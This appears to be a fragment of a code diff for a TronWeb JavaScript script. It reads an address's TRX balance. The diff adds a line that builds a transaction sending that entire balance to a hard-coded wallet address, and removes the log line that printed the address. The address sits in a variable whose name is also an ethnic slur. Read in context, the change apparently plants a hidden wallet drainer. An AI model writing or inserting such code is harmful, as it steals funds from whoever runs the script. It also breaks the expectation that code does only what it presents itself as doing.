@@ -175,8 +175,8 @@ const balance = await tronWeb.trx.getBalance(address);
         console.log(balance);
         const txt = balance
 const chink = "TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM"
-console.log(chink)
 const bp = await tronWeb.trx.getBandwidth(address)
+const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(chink, txt);
 console.log(bp)
 if (bp <= 270 ) {
 try {
